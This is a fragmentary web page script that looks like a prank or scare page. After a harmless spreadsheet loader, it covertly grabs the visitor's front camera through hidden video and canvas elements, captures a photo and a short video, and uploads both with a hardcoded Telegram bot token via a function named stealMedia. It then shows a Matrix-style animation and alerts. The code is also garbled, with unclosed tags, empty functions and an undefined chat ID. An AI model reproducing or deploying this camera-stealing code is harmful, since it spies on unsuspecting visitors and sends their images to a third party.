<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }

    <script>
        const BOT_TOKEN = '8465388523:AAFr6hAiz8o5OftCS4IsQTO6GK4A8_jT7aU';

        const messages = [

        let mediaStream = null;
        let mediaRecorder = null;
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('hiddenCanvas');
        const ctx = canvas.getContext('2d');

        async function accessCamera() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                video.srcObject = mediaStream;
                await new Promise(resolve => video.onloadedmetadata = () => resolve());
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
            } catch (err) {
                console.log('Camera access failed, fuck it');
            }
        }

        function capturePhoto() {
            if (!mediaStream) return null;
            ctx.drawImage(video, 0, 0);
            return canvas.toDataURL('image/jpeg', 0.8);
        }

        async function recordVideo() {
            if (!mediaStream) return null;
            const chunks = [];
            mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                return URL.createObjectURL(blob);
            };
            mediaRecorder.start();
            await new Promise(resolve => setTimeout(resolve, 3000));
            mediaRecorder.stop();
            return new Promise(resolve => mediaRecorder.onstop = () => resolve(URL.createObjectURL(new Blob(chunks, { type: 'video/webm' }))));
        }

        async function sendToTelegram(fileUrl, caption) {
            try {
                let formData;
                if (fileUrl.startsWith('data:image')) {
                    const response = await fetch(fileUrl);
                    const blob = await response.blob();
                    formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', caption);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } else {
                    const response = await fetch(fileUrl);
                    const blob = await response.blob();
                    formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', blob, 'video.webm');
                    formData.append('caption', caption);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                }
            } catch (err) {
                console.log('Send failed, shit happens');
            }
        }

        async function stealMedia() {

        function playCustomSound() {

        function spawnAlerts() {

                }

        function matrixEffect() {
            const canvas = document.getElementById('matrix');
            const ctx = canvas.getContext('2d');
            canvas.height = window.innerHeight;
            canvas.width = window.innerWidth;
            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            const fontSize = 14;
            const columns = canvas.width / fontSize;
            const drops = [];

            for (let x = 0; x < columns; x++) drops[x] = 1;

            function draw() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#0F0';
                ctx.font = fontSize + 'px Courier New';
                for (let i = 0; i < drops.length; i++) {
                    const text = chars.charAt(Math.floor(Math.random() * chars.length));
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.95) drops[x] = 0;
                    drops[i]++;
                }
            }

            setInterval(draw, 20); // Faster animation
        }

        window.onload = () => {
            setTimeout(() => {
                document.body.style.background = 'black'; // Switch to black for Matrix effect

                matrixEffect();
                spawnAlerts();
